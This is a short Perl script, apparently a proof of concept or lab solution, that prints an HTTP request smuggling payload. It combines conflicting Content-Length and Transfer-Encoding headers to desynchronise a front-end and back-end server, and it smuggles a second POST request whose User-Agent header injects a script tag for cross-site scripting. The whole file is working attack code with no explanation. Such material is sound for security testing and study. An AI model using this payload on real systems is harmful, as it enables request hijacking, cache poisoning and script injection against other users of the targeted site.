#!/usr/bin/perl
#
use strict;
use warnings;

my $payload = shift @ARGV;
my $length = 12 + length($payload);
my $smuggled_request = "POST / HTTP/1.1
Content-Type: application/x-www-form-urlencoded
User-Agent: a\"/><script>alert(1)</script>
Content-Length: $length

$payload
0

";

my $smuggled_req_length = sprintf("%x", length($smuggled_request));

print "Content-length: 4
Transfer-Encoding: chunked

$smuggled_req_length
$smuggled_request";
print("---------");
